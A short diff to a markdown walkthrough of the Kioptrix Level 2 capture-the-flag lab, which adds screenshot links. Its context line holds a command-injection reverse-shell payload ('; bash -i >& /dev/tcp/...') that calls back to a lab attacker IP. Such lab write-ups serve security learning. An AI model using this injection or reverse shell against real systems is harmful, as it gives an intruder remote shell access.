@@ -24,7 +24,8 @@
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/id_test.png)
 
 - lets try a reverse shell using bash. `; bash -i >& /dev/tcp/10.0.2.6/443 0>&1`
-![]
+![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_code.png)
+![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_rev_shell.png)
 
 
 
